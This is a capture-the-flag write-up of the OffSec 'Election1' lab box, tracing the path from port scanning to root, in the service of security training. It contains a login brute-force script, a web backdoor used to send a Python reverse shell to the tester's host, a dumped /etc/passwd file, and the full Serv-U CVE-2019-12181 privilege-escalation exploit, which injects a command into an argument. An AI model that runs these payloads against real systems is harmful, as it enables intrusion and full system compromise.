---
layout: post
title: "[Offsec] Election1 writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge can be found at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/election/chall.png)

## Recon

```
> sudo nmap -sV -AO -p- 192.168.238.211
Starting Nmap 7.95 ( https://nmap.org ) at 2024-07-04 05:44 CDT
Nmap scan report for 192.168.238.211
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/4%OT=22%CT=1%CU=38706%PV=Y%DS=4%DC=T%G=Y%TM=66867D63
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%II=I%TS=A)SEQ(SP=10
OS:4%GCD=2%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%II=I%TS=A)S
OS:EQ(SP=FB%GCD=1%ISR=103%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%
OS:O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=55F2%RUD=G)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=56F2%RUD=G)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=57F2%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=58F2%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=59F2%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   40.30 ms 192.168.45.1
2   40.28 ms 192.168.45.254
3   41.54 ms 192.168.251.1
4   41.97 ms 192.168.238.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.68 seconds
```

```
> dirbuster-ng http://192.168.238.211/
{Dirbuster NG 0.1} (c)2012 WintermeW
FOUND http://192.168.238.211/// (response code 200)
FOUND http://192.168.238.211//javascript (response code 403)
FOUND http://192.168.238.211//phpmyadmin (response code 200)
```

We also check the robots.txt at the root path. `wordpress, admin, user` all return 404, so we'll take a look further into `/election`.

```
> curl http://192.168.238.211/robots.txt
admin
wordpress
user
election
```

Having a look around the site, there is nothing with potential. We can also download the source code, but it doesn't help much.

![info](/assets/images/election/info.png)

![source](/assets/images/election/source.png) 

```
> dirbuster-ng http://192.168.238.211/election
{Dirbuster NG 0.1} (c)2012 WintermeW
FOUND http://192.168.238.211/election// (response code 200)
FOUND http://192.168.238.211/election/admin (response code 200)
FOUND http://192.168.238.211/election/data (response code 200)
FOUND http://192.168.238.211/election/js (response code 200)
FOUND http://192.168.238.211/election/languages (response code 200)
FOUND http://192.168.238.211/election/lib (response code 200)
FOUND http://192.168.238.211/election/media (response code 200)
FOUND http://192.168.238.211/election/themes (response code 200)

> dirbuster-ng http://192.168.238.211/election/admin
{Dirbuster NG 0.1} (c)2012 WintermeW
FOUND http://192.168.238.211/election/admin// (response code 200)
FOUND http://192.168.238.211/election/admin/ajax (response code 200)
FOUND http://192.168.238.211/election/admin/components (response code 200)
FOUND http://192.168.238.211/election/admin/css (response code 200)
FOUND http://192.168.238.211/election/admin/img (response code 200)
FOUND http://192.168.238.211/election/admin/inc (response code 200)
FOUND http://192.168.238.211/election/admin/js (response code 200)
FOUND    (response code 200)
FOUND http://192.168.238.211/election/admin/plugins (response code 200)
```

The `/election/admin/logs` one looks promising. Let's check

![logs](/assets/images/election/log.png)

```
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```

![login](/assets/images/election/login.png)


We also can download the source code of the site. But it doesn't help much. I noticed in the login message of the `/election/admin` endpoint, the message stated "We couldn't find your ID number", furthermore, the login prompt only accepts at least 4 digits, so let's try to bruteforce it. However, I couldn't login with the password found in the log file.

```py
import requests

cookies = {
    'PHPSESSID': 'nlhbmuokvq7ljmtqgigbesl0vn',
    'el_lang': 'en-us',
    'blocked_num': '1',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'http://192.168.213.211',
    'Connection': 'keep-alive',
    'Referer': 'http://192.168.213.211/election/admin/',
    # 'Cookie': 'PHPSESSID=nlhbmuokvq7ljmtqgigbesl0vn; el_lang=en-us; blocked_num=1',
    'Priority': 'u=0',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

data = 'step=1&noinduk=4&sandi=P@$$w0rd@123'


for i in range(1000, 2000):
    response = requests.post('http://192.168.213.211/election/admin/ajax/login.php', cookies=cookies, headers=headers, data=f"step=1&noinduk={i}&sandi=P@$$w0rd@123")
    if "false" in response.text:
        # continue
        print(f"skipping {i}")
    else:
        print(f"found {i}")
```

```
skipping 1226
skipping 1227
skipping 1228
skipping 1229
skipping 1230
skipping 1231
skipping 1232
skipping 1233
found 1234
skipping 1235
skipping 1236
skipping 1237
skipping 1238
skipping 1239
skipping 1240
skipping 1241
```

![uid](/assets/images/election/uid.png)

![failed](/assets/images/election/failed.png)

At this point, we can go back to the phpmyadmin portal. Let's use hydra to bruteforce it.

```			
```

After logging in, first thing we can try is to execute arbitary with MariaDB.

![bd](/assets/images/election/backdoor.png)

![cmdid](/assets/images/election/cmdid.png)

```
GET /bd.php?cmd=python+-c+'a%3d__import__%3bb%3da("socket").socket%3bc%3da("subprocess").call%3bs%3db()%3bs.connect(("192.168.45.159",4444))%3bf%3ds.fileno%3bc(["/bin/sh","-i"],stdin%3df(),stdout%3df(),stderr%3df())' HTTP/1.1
Host: 192.168.238.211
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
love:x:1000:1000:love,,,:/home/love:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
lightdm:x:124:128:Light Display Manager:/var/lib/lightdm:/bin/false
```

Let's try to login as user `love` with the password from the log file. 

```
> ssh love@192.168.238.211
love@192.168.238.211's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

471 packages can be updated.
358 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Jul 16 15:05:34 2024 from 192.168.45.159
love@election:~$ 
```

Dang, we should have guessed it upon discovered the password. Let's move on on privilege escalation.

```
love@election:~$ find /usr -perm /4000 -type f
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
love@election:~$ ls -lah
total 104K
drwsrwxrwx 18 love love 4.0K Jul 16 15:09 .
drwxr-xr-x  3 root root 4.0K Apr  9  2020 ..
-rw-------  1 love love  187 Jul 16 15:10 .bash_history
drwxrwxrwx 15 love love 4.0K Apr  8  2020 .cache
drwxrwxrwx 14 love love 4.0K May 26  2020 .config
drwxrwxrwx  3 love love 4.0K Oct 20  2019 .dbus
drwxrwxrwx  2 love love 4.0K Apr  9  2020 Desktop
drwxrwxrwx  2 love love 4.0K Apr  8  2020 Documents
drwxrwxrwx  2 love love 4.0K Oct 20  2019 Downloads
drwxrwxrwx  3 love love 4.0K Oct 20  2019 .gnupg
drwxrwxrwx  2 love love 4.0K Oct 20  2019 .gvfs
-rwxrwxrwx  1 love love  11K Jun 16  2022 .ICEauthority
drwxrwxrwx  3 love love 4.0K Oct 20  2019 .local
-rw-r--r--  1 root root   33 Jul 16 06:08 local.txt
drwxrwxrwx  5 love love 4.0K Apr  2  2020 .mozilla
drwxrwxrwx  2 love love 4.0K Oct 20  2019 Music
drwxrwxrwx  2 love love 4.0K Oct 21  2019 Pictures
-rwxrwxrwx  1 love love  807 Oct 20  2019 .profile
drwxrwxrwx  2 love love 4.0K Oct 20  2019 Public
-rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor
-rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf
drwxrwxrwx  2 love love 4.0K Jun 16  2022 .ssh
-rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
drwxrwxrwx  2 love love 4.0K Oct 20  2019 Templates
drwxrwxrwx  2 love love 4.0K Oct 20  2019 Videos
love@election:~$ file /usr/local/Serv-U/Serv-U
/usr/local/Serv-U/Serv-U: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=d6027556ae11dbbeae4d84f0429e11a684302417, stripped
love@election:~$ systemctl status Serv-U.service 
● Serv-U.service - LSB: Serv-U
   Loaded: loaded (/etc/init.d/Serv-U; generated)
   Active: active (running) since Mon 2023-01-23 15:57:13 IST; 1 years 5 months ago
     Docs: man:systemd-sysv-generator(8)
  Process: 1722 ExecStart=/etc/init.d/Serv-U start (code=exited, status=0/SUCCESS)
    Tasks: 6 (limit: 1115)
   CGroup: /system.slice/Serv-U.service
           └─1734 ./Serv-U -startservice

Jan 23 15:57:12 election Serv-U[1722]: Serv-U is starting...
Jan 23 15:57:12 election Serv-U[1733]: pid 001733, uid 0000 : Started (-startservice)
Jan 23 15:57:12 election Serv-U[1733]: pid 001733, uid 0000 : Terminated
Jan 23 15:57:12 election Serv-U[1734]: pid 001734, uid 0000 : Daemon Started
Jan 23 15:57:12 election Serv-U[1734]: Version Check. Running: 15.1.6.25, Available: 15.1.6.25
Jan 23 15:57:13 election Serv-U[1747]: pid 001747, uid 0000 : Started (-isrunning)
Jan 23 15:57:13 election Serv-U[1747]: pid 001747, uid 0000 : Stopped
Jan 23 15:57:13 election Serv-U[1722]: Serv-U is running
Jan 23 15:57:13 election systemd[1]: Started LSB: Serv-U.
Jul 16 06:10:47 election Serv-U[1734]: Version Check. Running: 15.1.6.25, Available: 15.1.6.25
```

`/usr/local/Serv-U/Serv-U` looks interesting. It's a proprietary FTP and MFT server from SolarWinds. Upon a quick search on Google, I found [this](https://www.exploit-db.com/exploits/47009)

```
/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

```
love@election:~$ gcc pe.c 
love@election:~$ ./a.out 
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# pwd
/home/love
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
# cd /root      
# ls
Desktop  Documents  Downloads  Music  Pictures  proof.txt  Public  Templates  Videos
# cat proof.txt 
8897694226db3b06ea8a4df87006e687
```

